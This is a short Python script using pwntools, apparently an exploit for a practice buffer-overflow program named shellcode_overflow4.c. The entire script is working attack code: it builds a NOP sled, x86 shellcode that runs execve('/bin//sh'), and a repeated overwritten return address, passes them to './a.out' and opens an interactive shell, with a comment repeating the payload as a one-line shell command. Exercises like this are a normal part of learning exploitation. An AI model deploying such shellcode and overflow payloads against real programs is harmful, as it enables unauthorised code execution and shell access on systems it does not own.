# exploit for shellcode_overflow4.c

from pwn import *

n1nops = 377
n2nops = 100
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
address = b"\x74\xcd\xff\xff"

p = process(['./a.out', b'\x90' * n1nops + shellcode + b'\x90' * n2nops + address * 4])

p.interactive()

# ./a.out $(python -c 'print (b"\x90" * 377 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + b"\x90" * 100 + b"\x74\xcd\xff\xff" * 4)')


